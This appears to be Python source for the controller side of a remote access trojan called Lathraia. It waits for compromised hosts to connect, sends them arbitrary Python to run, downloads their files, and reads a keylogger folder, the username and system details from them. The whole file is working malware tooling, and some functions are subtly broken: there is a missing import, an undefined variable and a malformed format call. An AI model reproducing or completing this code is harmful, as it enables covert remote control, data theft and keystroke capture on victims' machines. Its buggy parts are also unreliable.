import os
import sys
import socket
import random

import threading

from conf import *
from functions import *

# This is the main class for the Client
# This means that Lathraia is now object-oriented.
# Previously, it was procedural, so we would have functions like:
# def client_send_and_get_command(clientfd, command)
# which was terribly inefficient.
# Thankfully, I grew up and started to rewrite this program to utilize classes, which worked astoundingly.


# Main class.
# To prevent ambiguity, one should import this by Client.client.Client
class Client:
    # Variables for the threads, so we can interact with them
    _file_get_overwrite = False # Setting this will toggle overwrite
    _file_get_location_change = False # This will change the local folder that files are downloaded into to. It's local to prevent security vulnerabilities.
    _file_get_location = "" # This is the actual folder name. You need ---^ in order for this to be executed.
    #----------^ Make sure to set these back to their original state!
    

    def get_keylog_folder(self):
        """ This will return the keylogs folder of the server """
        return self.send_command("print(KEYLOGGER_FOLDER_LOCATION)")

    def file_request(self, server_filename):
        """ This will request a file send to the client from the server. """
        return self.send_command("upload('{filename}')".format(
            filename = server_filename
        ))

        print("Requested file.")

    def file_give(self, filename, filesize, server_path):
        """ This function sends a file over to the given connection, with the given protocol"""
        # The protocol is quite simple and it doesn't need much explaining.
        # The first line to be sent from either the client or the server determines who is receiving.
        # The actual information within that line is within this format:
        # filename:size of file:server path, where the filename is the filename, the size is the size
        # of the filename in bytes, and the server path is where that file is going - and what it will be
        # named.

        relative_filename = os.path.relpath(filename)

        self.fconnfd.send("{filename}:{size}:{server_path}".format(
            filename = relative_filename, 
            size = filesize,
            server_path = server_path
        ).encode())

        fd = open(filename, "rb")
        time.sleep(3)
        self.fconnfd.send(fd.read())
        fd.close()

    def file_receive(self, filename, filesize):
        """ A function for receiving a given file, based on a 'few' parameters"""
        filedata = recvall(self.fconnfd, int(filesize))

        if (not filedata):
            dprint("An error occured while trying to receive the file!")
            return

        # The path to the file in dir format, without the trailing filename.
        dir_path = self.connection_folder + FILES_DIR

        if (self._file_get_location_change):
            print("File location is different!")
            dir_path = self.connection_folder + self._file_get_location

        file_path = dir_path + filename

        if (not os.path.exists(dir_path)):
            os.mkdir(dir_path)

        if (os.path.exists(file_path) and not (self._file_get_overwrite)):
            filename = filename + str(random.randint(500, 10000))

        fp = open(dir_path + filename, "wb+")

        dprint("\nDownloading {filename} with a size of {size} bytes".format(
            filename = filename,
            size = filesize
        ))

        fp.write(filedata)
        fp.close()


    # This internal thread will detect incoming files and deal with them accordingly
    def __fsocket_receive(self):
        while True:
            try:
                data = self.fconnfd.recv(BUFFER_RECEIVE_SIZE).decode()

                # The program crashed. The error handling on this does not need to be too intense, as this
                # is only the client. I don't care if it crashes - and in this instance, it crashes here when
                # the server crashes, so it's completely fine.

                if (not data):
                    continue
                filename, filesize = data.split(":")
                self.file_receive(filename, filesize)
            except Exception as err:
                dprint("File receive thread: " + str(err))
                time.sleep(3)
        


    # Internal function for listening on the file socket
    def __fsocket_listen(self, fsocketfd):
        # This one is for the file/data port
        while True:
            self.fconnfd, self.faddr = fsocketfd.accept()
            dprint("File socket connection from " + str(self.faddr[0]))

            if (self.faddr[0] != self.ip_address):
                dprint("A file connection attempt was made, but the user does not have the ip address that you selected for.")
                self.fconnfd.close()
                continue

            self.fcallsign = self.fconnfd.recv(BUFFER_RECEIVE_SIZE).decode()

            if (self.fcallsign != self.client_callsign):
                dprint("A connection attempt was made, but the user did not have the correct callsign")
                self.fconnfd.close()
                continue

            break
    
    # Internal function for listening on the normal socket
    def __socket_listen(self, socketfd):
        while True:
            self.connfd, self.addr = socketfd.accept()
            dprint("Socket connection from {ip}:{port}".format(ip = self.addr[0], port = self.addr[1]))

            if ((self.addr[0]) != self.ip_address):
                dprint("A connection attempt was made, but the user does not have the ip address that you selected for.")
                self.connfd.close()
                continue

            self.server_callsign = self.connfd.recv(BUFFER_RECEIVE_SIZE).decode()


            if (self.server_callsign != self.client_callsign):
                dprint("A connection attempt was made, but the user did not have the correct callsign")
                self.connfd.close()
                continue
            
            break

    def __init__(self, ip_address, callsign):
        # Initalize __init__ vars
        self.ip_address = ip_address
        self.client_callsign = callsign

        #Initalize Python Server (Main server)
        self.socketfd = socket.socket()
        self.socketfd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socketfd.bind(("", PORT))
        self.socketfd.listen()

        # Initalize File Server
        self.fsocketfd = socket.socket()
        self.fsocketfd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.fsocketfd.bind(("", DATA_PORT))
        self.fsocketfd.listen()

        dprint("Waiting for a connection...!")

        # Listen for incoming connections - weed out the ones which are not under our constraints
        self.__socket_listen(self.socketfd)
        self.__fsocket_listen(self.fsocketfd)

        # Start the file socket receiving
        threading._start_new_thread(self.__fsocket_receive, ())


        # Extra setup
        self.connection_folder = CONNECTION_NAME_FORMAT.format(
            server_folder = SERVER_FOLDER,
            ip = self.addr[0],
            callsign = self.server_callsign
        )
        
        if (not os.path.exists(self.connection_folder)):
            os.mkdir(self.connection_folder)

    def send_command(self, command):
        """ Send a Python command and get back the output from the server """
        
        # This is very useful for the modification of this program!
        # You can send Python - then get it back, with a simple function!

        self.connfd.sendall(command.encode())

        response = self.connfd.recv(BUFFER_RECEIVE_SIZE)
        return response.decode()

    def interpret_command(self, command):
        """ Format commands from the client """

        # Execute local python code
        # $ [python]
        if (command.startswith("$")):
            try:
                exec(command.split("$")[1])
            except Exception as err:
                print("Error executing command: ", str(err))

        # Normal behavior.
        # Send python code over for the server to interpret it.
        else:
            print(self.send_command(command))


        # Additional functions
    def get_distro(self):
            return self.send_command("print(open('/etc/issue', 'r').read())", connfd).lower().split()[0]

    def cwd(self):
        """ Returns the current working directory of the server. """
        return self.send_command("sys.stdout.write(os.getcwd())").rstrip()

    def get_server_username(self):
        """ Returns the server username """
        return self.send_command("print(os.getenv('USER'))")

    def get_directory_list(self, directory = ""):
        """ Returns a list of all files and child directories within a given one."""
        if (directory == ""):
            directory = self.cwd()

        _keylogs = c.send_command("print(':'.join(os.listdir('{dir}')))".format(
            directory
        ))

        keylogs = _keylogs.split(":")
        return keylogs

def recvall(conn, length):
    buf = b''
    while len(buf) < length:
        data = conn.recv(length - len(buf))
        if not data:
            return data
        buf += data
    return buf